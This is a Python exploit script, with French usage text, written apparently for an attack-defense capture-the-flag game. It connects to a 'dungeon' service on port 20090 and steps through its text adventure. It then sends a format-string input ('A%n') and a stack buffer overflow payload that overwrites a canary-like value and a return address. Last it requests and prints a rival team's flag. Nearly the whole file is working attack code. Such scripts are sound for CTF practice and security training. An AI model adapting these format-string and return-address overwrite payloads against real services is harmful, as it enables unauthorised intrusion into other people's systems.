#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
import time

if len(sys.argv) != 3 :
    print("Exploit du service dungeon\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20090

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

try :
  time.sleep(0.1)
  init_ack = s.recv(4096)

  s.send('2016\n')
  time.sleep(0.1)
  test_2016_ack = s.recv(4096)

  s.send('west\n')
  time.sleep(0.2)
  plane_ack = s.recv(4096)

  plane = ''

  if """'==.I\_____________..--"<__""" in plane_ack :
    plane = 'f16'

  if """-=========================='===^==^==^=====^==='=============================-""" in plane_ack :
    plane = 'f117'

  if """XXMMMMm8888888888888888888888888WWWMMMMMMMM""" in plane_ack :
    plane = 'sr71'

  s.send(plane+'\n')
  time.sleep(0.1)
  plane_ack = s.recv(4096)

  s.send('east\n')
  time.sleep(0.1)
  init_2_ack = s.recv(4096)

  s.send('2016\n')
  time.sleep(0.1)
  test_2016_2_ack = s.recv(4096)

  s.send('east\n')
  time.sleep(0.1)
  dwarf_ack = s.recv(4096)

  s.send('1\n')
  time.sleep(0.1)
  dwarf_fail_ack = s.recv(4096)

  s.send('east\n')
  time.sleep(0.1)
  auth_ack = s.recv(4096)

  s.send('1\n')
  time.sleep(0.1)
  auth_fail_ack = s.recv(4096)

  s.send('east\n')
  time.sleep(0.1)
  gnome_ack = s.recv(4096)

  s.send('A\x25n\n')
  time.sleep(0.1)
  gnome_formatstringatk_ack = s.recv(4096)

  s.send('east\n')
  time.sleep(0.1)
  dragon_ack = s.recv(4096)

  s.send('kill dragon\n')
  time.sleep(0.1)
  dragon_kill_ack = s.recv(4096)

  payload =  88*'A' + '\xef\xbe\xad\xde' + 12*'A' + '\xbd\x96\x04\x08\n'
  s.send(payload)
  time.sleep(0.1)
  overflow_ack = s.recv(4096)

  s.send('get ' + target + '\n')
  time.sleep(0.1)
  flag_ack = s.recv(4096)  

  print(flag_ack.split()[3])


except socket.error:
  print("Erreur lors de l'envoi")
  sys.exit()
